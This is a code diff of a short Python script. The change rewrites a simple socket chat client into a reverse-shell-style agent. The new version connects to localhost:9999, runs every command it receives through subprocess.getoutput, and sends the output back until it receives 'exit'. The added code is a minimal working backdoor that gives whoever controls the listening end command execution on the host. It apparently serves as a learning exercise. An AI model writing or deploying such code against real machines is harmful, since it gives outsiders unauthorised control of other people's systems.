@@ -1,19 +1,21 @@
 import socket
+import subprocess as sp
 
-ip_adress = '127.0.0.1'
-port_number = 1234
+ip_adress = 'localhost'
+port_number = 9999
 
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-client_socket.connect((ip_adress, port_number))
+server_socket.connect((ip_adress, port_number))
 
-msg = input("Enter msg to send :")
+msg = "connection established"
 
-while msg != 'quit':
-    client_socket.send(msg.encode())
-    msg = client_socket.recv(1024).decode()
-    print(msg)
-    msg = input("Enter msg to send :")
+while msg != 'exit':
+    msg=server_socket.recv(2048).decode('utf-8')
+    output = sp.getoutput(msg)
+    if(output == '' ):
+        output = "no output"
+    msg = bytes(output, 'utf-8')
+    server_socket.sendall(msg)
 
-
-client_socket.close()
+server_socket.close()
